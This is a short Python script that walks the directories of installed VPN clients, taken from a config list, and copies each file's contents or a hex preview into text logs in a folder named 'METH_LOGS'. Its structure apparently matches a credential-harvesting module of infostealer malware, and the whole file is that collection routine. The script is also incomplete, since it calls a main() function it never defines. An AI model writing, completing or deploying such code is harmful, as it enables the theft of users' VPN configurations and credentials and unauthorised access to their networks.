import os
from pathlib import Path
from config.paths import VPNS

LOG_DIR = Path("METH_LOGS")
LOG_DIR.mkdir(exist_ok=True)

def extract_vpn_content(name, base_path):
    base = os.path.expandvars(base_path)
    if not os.path.exists(base):
        return

    category_file = LOG_DIR / f"vpns_{name.lower().replace(' ', '_')}.txt"
    with open(category_file, "w", encoding="utf-8", errors="ignore") as log:
        log.write(f"=== {name} ===\n\n")
        log.write(f"Base path: {base}\n\n")

        try:
            for root, dirs, files in os.walk(base):
                for file in files:
                    full = os.path.join(root, file)
                    rel = os.path.relpath(full, base)
                    log.write(f"File: {rel}\n")
                    try:
                        with open(full, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read(4000)
                            log.write("Content:\n")
                            log.write(content + "\n")
                    except:
                        with open(full, "rb") as f:
                            data = f.read(512)
                            log.write("Binary preview (hex):\n")
                            log.write(data.hex() + "\n")
                    log.write("-" * 60 + "\n")
        except Exception as e:
            log.write(f"Error: {e}\n")

if __name__ == "__main__":
    main()